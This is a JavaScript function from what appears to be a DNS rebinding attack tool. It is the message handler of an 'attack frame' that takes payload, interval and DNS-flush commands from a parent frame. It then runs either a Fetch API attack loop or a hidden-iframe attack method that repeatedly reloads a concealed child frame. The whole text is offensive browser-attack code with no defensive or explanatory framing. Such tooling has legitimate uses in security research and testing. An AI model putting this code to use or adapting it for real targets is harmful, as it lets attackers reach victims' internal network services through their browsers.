function initCommsWithParentFrame() {
        window.addEventListener('message', function (e) {
            console.log('attack frame', window.location.hostname, 'received message', e.data.cmd);

            switch (e.data.cmd) {
                case 'payload':
                    payload = e.data.param;
                    break;
                case 'interval':
                    interval = parseInt(e.data.param) * 1000;
                    break;
                case 'indextoken':
                    indextoken = e.data.param;
                    break;
                case 'wsproxyport':
                    wsproxyport = e.data.param;
                    break;
                case 'flushdns':
                    if (e.data.param.flushDns === true) {
                        console.log('Flushing Browser DNS cache.');
                        flushBrowserDnsCache(e.data.param.hostname);
                    }
                    break;
                case 'stop':
                    clearInterval(timer);
                    if (rebindingSuccess === false) {
                        rebindingStatusEl.innerText = `DNS rebinding failed!`;
                    }
                    break;
                case 'startFetch': // Fetch API attack method
                    console.log('payload.js: Fetch API attack method');
                    timer = setInterval(function () { run() }, interval);
                    console.log('frame', window.location.hostname, 'waiting', interval,
                        'milliseconds for dns update');
                    break;
                case 'startReloadChildFrame': // iframe attack method
                    console.log('payload.js: iframe attack method');
                    let f = document.createElement('iframe');
                    f.src = url
                    f.setAttribute('id', 'childFrame');
                    f.setAttribute('style', "display: none");
                    document.body.appendChild(f);
                    sooFetch = (resource, options) => {
                        const cw = document.getElementById('childFrame').contentWindow;
                        return cw.fetch(resource, options)
                    }
                    document.getElementById('childFrame').onload = onChildFrameLoad;
                    timer = setInterval(function () { document.getElementById('childFrame').src = `${window.origin}`; }, interval);           
            }
        });
    }